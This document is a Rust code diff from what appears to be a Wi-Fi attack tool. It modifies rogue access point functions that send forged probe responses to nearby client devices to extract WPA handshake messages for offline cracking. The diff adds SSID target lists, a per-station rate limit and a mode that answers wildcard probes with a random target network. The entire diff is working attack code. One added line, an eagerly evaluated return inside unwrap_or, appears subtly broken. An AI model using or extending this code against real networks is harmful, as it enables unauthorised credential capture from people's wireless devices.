@@ -1,11 +1,15 @@
 // Attack! //
 
-use std::os::fd::AsRawFd;
+use std::{
+    os::fd::AsRawFd,
+    time::{Duration, SystemTime},
+};
 
 use libwifi::frame::{
     components::{MacAddress, RsnCipherSuite},
     DeauthenticationReason, ProbeRequest,
 };
+use rand::seq::SliceRandom;
 
 use crate::{
     status::{MessageType, StatusMessage},
@@ -333,12 +337,21 @@ pub fn rogue_m2_attack_directed(
     }
     let ssid = probe.station_info.ssid.unwrap();
 
+    // Check SSID against SSID targets
+    if !oxide.stargets.is_empty() && !oxide.stargets.contains(&ssid) {
+        return Ok(());
+    }
+
     // Grab the station from our unnasoc. clients list.
     let station = if let Some(dev) = oxide.unassoc_clients.get_device(&probe.header.address_2) {
         dev
     } else {
         return Ok(());
     };
+
+    if station.timer_interact.elapsed().unwrap() < Duration::from_secs(3) {
+        return Ok(());
+    }
 
     // If we have an AP for this SSID, we will use as many of the same details as possible
     if let Some(ap) = oxide.access_points.get_device_by_ssid(&ssid) {
@@ -361,6 +374,7 @@ pub fn rogue_m2_attack_directed(
         );
         write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
         station.interactions += 1;
+        station.timer_interact = SystemTime::now();
         oxide.status_log.add_message(StatusMessage::new(
             MessageType::Info,
             format!("Direct Rogue AP Attack: {} ({})", station.mac_address, ssid),
@@ -389,85 +403,86 @@ pub fn rogue_m2_attack_undirected(
         return Ok(());
     };
 
+    if station.timer_interact.elapsed().unwrap() < Duration::from_secs(3) {
+        return Ok(());
+    }
+
     if let Some(ssid) = probe.station_info.ssid {
-        // In this case we have an SSID to send, which is good. If we have a target deck, and the SSID matches the SSID we have for that AP (in the target deck) then we send a response.
-        if !oxide.targets.is_empty() {
-            // We have a target deck
-            if let Some(ap) = oxide.access_points.get_device_by_ssid(&ssid) {
-                // AP exists
+        // Target validation stuff
+        let mut target_checks = false;
+        let mut is_target = false;
 
-                // Does the target deck contain our AP?
-                if !oxide.targets.contains(&ap.mac_address) {
-                    return Ok(());
-                }
+        if !oxide.targets.is_empty() || !oxide.stargets.is_empty() {
+            target_checks = true;
+        }
 
-                // Do we already have a rogue-M2 from this station?
-                if station.has_rogue_m2 {
-                    return Ok(());
-                }
+        // Is the AP the SSID belongs to (based on our survey) in our MAC Targets?
+        if oxide
+            .access_points
+            .get_device_by_ssid(&ssid)
+            .is_some_and(|ap| oxide.targets.contains(&ap.mac_address))
+        {
+            is_target = true;
+        }
 
-                let frx = build_probe_response(
-                    &probe.header.address_2,
-                    &oxide.rogue_client,
-                    &ssid,
-                    oxide.counters.sequence3(),
-                    oxide.current_channel.get_channel_number(),
-                );
-                write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
-                station.interactions += 1;
-                oxide.status_log.add_message(StatusMessage::new(
-                    MessageType::Info,
-                    format!(
-                        "Indirect Rogue AP Attack: {} ({})",
-                        station.mac_address, ssid
-                    ),
-                ));
-            }
-        } else {
-            // no targets, just send a probe with the SSID back.
+        // Is the SSID in our stargets?
+        if oxide.stargets.contains(&ssid) {
+            is_target = true;
+        }
+
+        // Both checks fail, we shouldn't persue this.
+        if target_checks && !is_target {
+            return Ok(());
+        }
+
+        // Do we already have a rogue-M2 from this station (for this SSID)
+        if station.rogue_actions.get(&ssid).is_some_and(|f| *f) {
+            return Ok(());
+        }
+
+        let frx = build_probe_response(
+            &probe.header.address_2,
+            &oxide.rogue_client,
+            &ssid,
+            oxide.counters.sequence3(),
+            oxide.current_channel.get_channel_number(),
+        );
+        write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
+        station.interactions += 1;
+        station.timer_interact = SystemTime::now();
+        oxide.status_log.add_message(StatusMessage::new(
+            MessageType::Info,
+            format!(
+                "Indirect Rogue AP Attack: {} ({})",
+                station.mac_address, ssid
+            ),
+        ));
+    } else {
+        // We don't want to nest this...
+        if !oxide.stargets.is_empty() {
+            // Pick a random SSID from our targets and respond.
+            let target = &oxide
+                .stargets
+                .choose(&mut rand::thread_rng())
+                .unwrap_or(return Ok(()));
+
             let frx = build_probe_response(
                 &probe.header.address_2,
                 &oxide.rogue_client,
-                &ssid,
+                target,
                 oxide.counters.sequence3(),
                 oxide.current_channel.get_channel_number(),
             );
             write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
             station.interactions += 1;
+            station.timer_interact = SystemTime::now();
             oxide.status_log.add_message(StatusMessage::new(
                 MessageType::Info,
                 format!(
-                    "Indirect Rogue AP Attack: {} ({})",
-                    station.mac_address, ssid
+                    "Anonymous Rogue AP Attempt: {} ({})",
+                    station.mac_address, target
                 ),
             ));
-        }
-    } else {
-        // We don't want to nest this...
-        if !oxide.targets.is_empty() {
-            // We have targets, iterate through our targets list and if we have an AP seen for the SSID we can send our own Probe Response... maybe we can force a WPA2 authentication.
-            for target in &oxide.targets {
-                if let Some(ap) = oxide.access_points.get_device(target) {
-                    if let Some(ssid) = &ap.ssid {
-                        let frx = build_probe_response(
-                            &probe.header.address_2,
-                            &oxide.rogue_client,
-                            ssid,
-                            oxide.counters.sequence3(),
-                            oxide.current_channel.get_channel_number(),
-                        );
-                        write_packet(oxide.tx_socket.as_raw_fd(), &frx)?;
-                        station.interactions += 1;
-                        oxide.status_log.add_message(StatusMessage::new(
-                            MessageType::Info,
-                            format!(
-                                "Indirect Rogue AP Attack: {} ({})",
-                                station.mac_address, ssid
-                            ),
-                        ));
-                    }
-                }
-            }
         }
     }
 
